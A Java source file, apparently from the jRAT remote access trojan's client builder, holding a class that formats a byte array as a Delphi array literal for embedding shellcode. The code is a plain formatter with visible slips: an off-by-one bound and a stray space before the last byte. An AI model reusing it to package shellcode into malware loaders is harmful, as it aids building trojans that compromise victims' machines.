package su.jrat.client.build.shellcode;

public class Delphi implements Shellcode {

	@Override
	public String generate(String arrayName, byte[] array) throws Exception {
		StringBuilder builder = new StringBuilder();

		builder.append(arrayName + ": array[0.." + array.length + "] of byte =" + Util.lineSeparator);
		builder.append("(" + Util.lineSeparator + "     ");

		int count = 0;
		for (int i = 0; i < array.length; i++) {
			byte b = array[i];

			count++;

			if (i == array.length - 1) {
				builder.append("$ " + Util.get2DigitByte(b));
			} else {
				builder.append("$" + Util.get2DigitByte(b) + ", ");
				if (count >= 16) {
					count = 0;
					builder.append(Util.lineSeparator + "     ");
				}
			}
		}

		builder.append(Util.lineSeparator + ");");

		return builder.toString();
	}

}
